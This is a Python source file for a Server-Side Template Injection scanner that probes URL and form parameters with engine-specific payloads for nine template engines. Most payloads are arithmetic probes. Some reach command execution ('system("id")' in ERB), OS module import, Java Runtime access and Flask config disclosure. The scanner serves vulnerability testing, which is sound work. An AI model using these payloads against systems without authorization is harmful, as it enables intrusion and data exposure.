# janus/attack/ssti_scanner.py
"""
Server-Side Template Injection (SSTI) Scanner.

Tests for template injection vulnerabilities in:
- Jinja2 (Python/Flask)
- Twig (PHP)
- Freemarker (Java)
- Velocity (Java)
- Smarty (PHP)
- Mako (Python)
- ERB (Ruby)
- Pebble (Java)

Each engine has distinct syntax patterns that can be tested.
"""

import requests
import re
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode
from datetime import datetime


@dataclass
class SSTIFinding:
    """A single SSTI finding."""
    parameter: str
    payload: str
    template_engine: str
    evidence: str
    severity: str
    description: str
    recommendation: str
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class SSTIReport:
    """SSTI scan report."""
    target_url: str
    scan_time: str
    parameters_tested: int
    vulnerable_params: int
    findings: List[SSTIFinding] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            **{k: v for k, v in asdict(self).items() if k != 'findings'},
            'findings': [f.to_dict() for f in self.findings]
        }


class SSTIScanner:
    """
    Server-Side Template Injection Scanner.
    
    Tests multiple template engines with engine-specific payloads
    that produce deterministic output for verification.
    """
    
    # Payload format: (payload, expected_output, engine_name)
    # Uses math expressions that produce predictable results
    PAYLOADS = {
        'jinja2': [
            ('{{7*7}}', '49', 'Jinja2'),
            ('{{7*\'7\'}}', '7777777', 'Jinja2'),
            ('{{config}}', 'Config', 'Jinja2 (config access)'),
            ('{{self.__class__.__mro__}}', 'tuple', 'Jinja2 (class access)'),
        ],
        'twig': [
            ('{{7*7}}', '49', 'Twig'),
            ('{{7*\'7\'}}', '49', 'Twig'),
            ('{{_self.env.display}}', 'Closure', 'Twig (env access)'),
        ],
        'smarty': [
            ('{7*7}', '49', 'Smarty'),
            ('{math equation="7*7"}', '49', 'Smarty'),
            ('{$smarty.version}', '.', 'Smarty (version)'),
        ],
        'freemarker': [
            ('${7*7}', '49', 'FreeMarker'),
            ('#{7*7}', '49', 'FreeMarker'),
            ('<#assign x=7*7>${x}', '49', 'FreeMarker'),
        ],
        'velocity': [
            ('#set($x=7*7)$x', '49', 'Velocity'),
            ('$class.inspect("java.lang.Runtime")', 'Runtime', 'Velocity (class)'),
        ],
        'mako': [
            ('${7*7}', '49', 'Mako'),
            ('<% import os %>${os.name}', 'posix', 'Mako (import)'),
        ],
        'erb': [
            ('<%= 7*7 %>', '49', 'ERB (Ruby)'),
            ('<%= system("id") %>', 'uid=', 'ERB (command)'),
        ],
        'pebble': [
            ('{{ 7*7 }}', '49', 'Pebble'),
            ('{% set x = 7*7 %}{{ x }}', '49', 'Pebble'),
        ],
        'thymeleaf': [
            ('[[${7*7}]]', '49', 'Thymeleaf'),
            ('[(${7*7})]', '49', 'Thymeleaf'),
        ],
        'generic': [
            # Generic payloads that work across engines
            ('${7*7}', '49', 'Generic ($)'),
            ('{{7*7}}', '49', 'Generic ({{}})'),
            ('#{7*7}', '49', 'Generic (#)'),
            ('*{7*7}', '49', 'Generic (*)'),
            ('@(7*7)', '49', 'Generic (@)'),
        ],
    }
    
    # Polyglot payloads that might work on multiple engines
    POLYGLOT_PAYLOADS = [
        ('{{7*7}}${7*7}#{7*7}', '49', 'Polyglot'),
        ('${{7*7}}', '49', 'Polyglot ${{}}'),
        ('${${7*7}}', '49', 'Nested ${}'),
    ]
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
    
    def scan(
        self,
        url: str,
        params: Optional[List[str]] = None,
        token: Optional[str] = None,
        engines: Optional[List[str]] = None,
        method: str = "GET"
    ) -> SSTIReport:
        """
        Scan URL for SSTI vulnerabilities.
        
        Args:
            url: Target URL (can include query params)
            params: Specific parameters to test (auto-detect if None)
            token: Authorization token
            engines: Specific engines to test (all if None)
            method: HTTP method
        
        Returns:
            SSTIReport with findings
        """
        findings = []
        headers = {'Authorization': token} if token else {}
        headers['User-Agent'] = 'Janus-SSTI-Scanner/1.0'
        
        # Parse URL and extract parameters
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        if params:
            test_params = params
        else:
            test_params = list(query_params.keys())
        
        if not test_params:
            # No params in URL, test common param names
            test_params = ['name', 'template', 'content', 'message', 'text', 'input', 'query', 'search']
        
        # Select engines to test
        engines_to_test = engines if engines else list(self.PAYLOADS.keys())
        
        for param in test_params:
            for engine in engines_to_test:
                if engine not in self.PAYLOADS:
                    continue
                    
                for payload, expected, engine_name in self.PAYLOADS[engine]:
                    result = self._test_payload(
                        url, param, payload, expected, engine_name,
                        method, headers
                    )
                    if result:
                        findings.append(result)
                        # Found vulnerability, no need to test more payloads for this engine
                        break
            
            # Also test polyglot payloads
            for payload, expected, engine_name in self.POLYGLOT_PAYLOADS:
                result = self._test_payload(
                    url, param, payload, expected, engine_name,
                    method, headers
                )
                if result:
                    findings.append(result)
                    break
        
        return SSTIReport(
            target_url=url,
            scan_time=datetime.now().isoformat(),
            parameters_tested=len(test_params),
            vulnerable_params=len(set(f.parameter for f in findings)),
            findings=findings
        )
    
    def _test_payload(
        self,
        url: str,
        param: str,
        payload: str,
        expected: str,
        engine_name: str,
        method: str,
        headers: Dict
    ) -> Optional[SSTIFinding]:
        """Test a single SSTI payload."""
        try:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            # Inject payload
            query_params[param] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            if method.upper() == "GET":
                response = requests.get(
                    test_url,
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                # For POST, put payload in body
                response = requests.post(
                    url,
                    data={param: payload},
                    headers=headers,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            
            # Check if expected output appears in response
            if expected in response.text:
                # Verify it's not just the payload reflected without execution
                if payload not in response.text or expected != payload:
                    return SSTIFinding(
                        parameter=param,
                        payload=payload,
                        template_engine=engine_name,
                        evidence=f"Expected '{expected}' found in response",
                        severity='CRITICAL',
                        description=f'Server-Side Template Injection detected using {engine_name}',
                        recommendation='Avoid passing user input directly to template engines. Use proper escaping or sandboxing.'
                    )
            
        except Exception:
            pass
        
        return None
    
    def quick_scan(
        self,
        url: str,
        token: Optional[str] = None
    ) -> Dict[str, Any]:
        """Quick scan with generic payloads only."""
        report = self.scan(url, token=token, engines=['generic'])
        
        return {
            "url": url,
            "vulnerable": report.vulnerable_params > 0,
            "params_tested": report.parameters_tested,
            "vulnerable_params": report.vulnerable_params,
            "findings": [f.to_dict() for f in report.findings]
        }
    
    def detect_engine(
        self,
        url: str,
        param: str,
        token: Optional[str] = None
    ) -> Optional[str]:
        """Try to detect which template engine is being used."""
        headers = {'Authorization': token} if token else {}
        
        # Engine-specific detection payloads
        detection_payloads = [
            ('{{7*7}}', '49', 'Jinja2/Twig'),
            ('${7*7}', '49', 'FreeMarker/Mako'),
            ('<%= 7*7 %>', '49', 'ERB'),
            ('{7*7}', '49', 'Smarty'),
            ('#set($x=7*7)$x', '49', 'Velocity'),
        ]
        
        for payload, expected, engine in detection_payloads:
            try:
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                
                response = requests.get(test_url, headers=headers, timeout=self.timeout)
                
                if expected in response.text and payload not in response.text:
                    return engine
            except Exception:
                pass
        
        return None
